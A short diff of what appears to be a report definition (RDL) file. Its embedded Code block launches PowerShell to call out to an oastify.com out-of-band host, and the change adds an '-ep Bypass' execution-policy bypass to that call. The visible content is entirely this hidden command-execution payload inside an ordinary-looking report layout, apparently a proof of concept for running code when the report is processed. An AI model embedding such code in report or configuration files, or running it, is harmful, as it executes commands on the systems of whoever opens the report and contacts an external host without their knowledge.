@@ -44,7 +44,7 @@
     </GridLayoutDefinition>
   </ReportParametersLayout>
   <Code>
-    Process.Start("powershell", "-c \"irm p8y3lfd5lrhzuke6y3bwprkdp4vvjt7i.oastify.com\"")
+    Process.Start("powershell", "-ep Bypass -c \"irm p8y3lfd5lrhzuke6y3bwprkdp4vvjt7i.oastify.com\"")
   </Code>
   <rd:ReportUnitType>Inch</rd:ReportUnitType>
   <rd:PageUnit>Px</rd:PageUnit>
